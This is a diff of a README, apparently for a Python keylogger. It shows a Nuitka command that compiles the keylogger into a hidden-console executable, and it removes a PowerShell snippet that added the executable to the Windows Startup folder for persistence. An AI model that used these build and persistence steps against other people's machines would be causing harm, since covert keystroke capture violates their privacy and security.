@@ -132,24 +132,7 @@ Use this command to compile:
 & "$env:USERPROFILE\AppData\Roaming\Python\Python312\Scripts\nuitka.cmd" --standalone --onefile --windows-disable-console keylogger.py
 ```
 
-The executable will be generated in the `keylogger.dist` folder.
-
----
-
-## 📦 Optional: Add to Startup (Windows)
-
-To make the `.exe` run at Windows startup:
-
-```powershell
-$shortcut = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.lnk"
-$target = "C:\Path\To\Your\keylogger.exe"
-$ws = New-Object -ComObject WScript.Shell
-$sc = $ws.CreateShortcut($shortcut)
-$sc.TargetPath = $target
-$sc.Save()
-```
-
-This will create a shortcut in the Startup folder that will launch the executable automatically when the system starts.
+The executable will be generated in the `keylogger` folder.
 
 ---
 
